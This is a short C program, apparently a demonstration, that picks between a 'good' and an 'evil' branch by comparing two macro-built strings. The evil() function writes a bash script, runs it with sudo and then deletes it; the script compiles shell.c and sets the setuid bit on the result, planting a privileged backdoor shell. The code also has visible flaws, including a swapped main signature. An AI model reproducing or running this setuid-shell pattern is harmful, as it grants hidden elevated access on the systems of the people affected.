#include <stdio.h>
#include <string.h>

#define BLOCK "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" \
              "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" \
              "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" \

void good();
void evil();
              
int main(char** argv, int argc) {
    char *first = BLOCK "+";
    char *second = BLOCK "-";
    
    if (memcmp(first, second, 192) == 0) {
        good();
    }
    else {
        evil();
    }
    
    return 0;
}

void good() {
   puts("good"); 
   system("gcc shell.c -o shell");
}

void evil() {
    puts("evil");
    FILE *script = fopen("./evil_script.sh", "w");
    fprintf(script, "#!/bin/bash\n");
    fprintf(script, "gcc shell.c -o shell\n");
    fprintf(script, "chmod u+x shell\n");
    fprintf(script, "chmod u+s shell\n");
    fclose(script);
    system("chmod +x ./evil_script.sh");
    system("sudo ./evil_script.sh");
    system("rm ./evil_script.sh");
    system("exit");
}